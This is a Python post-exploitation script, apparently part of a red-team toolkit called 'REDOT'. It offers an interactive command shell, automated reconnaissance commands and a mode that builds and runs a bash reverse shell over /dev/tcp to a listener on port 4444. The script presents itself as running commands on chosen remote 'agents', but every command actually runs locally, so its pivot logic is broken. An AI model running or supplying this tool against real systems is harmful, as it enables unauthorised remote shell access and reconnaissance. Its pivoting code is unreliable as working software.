#!/usr/bin/env python3
# cmd_executor.py - REDOT Command Execution Pivot Module

import subprocess
import os
import time
import json
import socket
from datetime import datetime

LOG_DIR = "logs/post"
os.makedirs(LOG_DIR, exist_ok=True)

AGENTS_FILE = "recon/agent_inventory.json"
DEFAULT_SHELLS = ["/bin/bash", "/bin/sh", "cmd.exe", "powershell.exe"]

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

def load_agents():
    try:
        with open(AGENTS_FILE, "r") as f:
            return json.load(f)
    except:
        return []

def log_output(agent, output):
    timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    log_path = os.path.join(LOG_DIR, f"{agent['name']}_{timestamp}.log")
    with open(log_path, "w") as f:
        f.write(output)

def run_command(command, shell):
    try:
        proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, executable=shell)
        out, _ = proc.communicate(timeout=20)
        return out.decode(errors="ignore")
    except Exception as e:
        return f"[!] Error executing command: {e}"

def interactive_mode(agent):
    print(f"--- INTERACTIVE SESSION [{agent['name']} @ {agent['ip']}] ---")
    shell = agent.get("shell", DEFAULT_SHELLS[0])
    while True:
        cmd = input("CMD> ").strip()
        if cmd.lower() in ["exit", "quit"]:
            break
        result = run_command(cmd, shell)
        print(result)
        log_output(agent, result)

def auto_exec(agent, cmds):
    shell = agent.get("shell", DEFAULT_SHELLS[0])
    for cmd in cmds:
        print(f"[+] Running: {cmd}")
        result = run_command(cmd, shell)
        print(result)
        log_output(agent, result)

def main():
    print("=== REDOT Post-Ex Command Executor ===")
    agents = load_agents()
    if not agents:
        print("[-] No agents found in recon/agent_inventory.json")
        return

    print("\nAvailable Agents:")
    for idx, agent in enumerate(agents):
        print(f"{idx+1}. {agent['name']} @ {agent['ip']}")

    try:
        choice = int(input("Select agent by number: ")) - 1
        agent = agents[choice]
    except:
        print("Invalid choice.")
        return

    print("\nChoose mode:")
    print("1. Interactive Shell")
    print("2. Run Predefined Commands")
    print("3. Setup Reverse Shell to Listener")
    mode = input("Enter 1, 2, or 3: ").strip()

    if mode == "1":
        interactive_mode(agent)
    elif mode == "2":
        commands = [
            "whoami",
            "hostname",
            "uname -a",
            "ip a" if os.name != "nt" else "ipconfig",
            "netstat -an",
            "ps aux" if os.name != "nt" else "tasklist"
        ]
        auto_exec(agent, commands)
    elif mode == "3":
        listener_ip = get_local_ip()
        port = input(f"Enter listener port (default 4444): ").strip() or "4444"
        payload = f"bash -i >& /dev/tcp/{listener_ip}/{port} 0>&1"
        print(f"[!] Reverse shell payload: {payload}")
        confirm = input("Execute on target? (yes/no): ").strip().lower()
        if confirm == "yes":
            result = run_command(payload, "/bin/bash")
            log_output(agent, result)
    else:
        print("Invalid mode.")

if __name__ == "__main__":
    main()
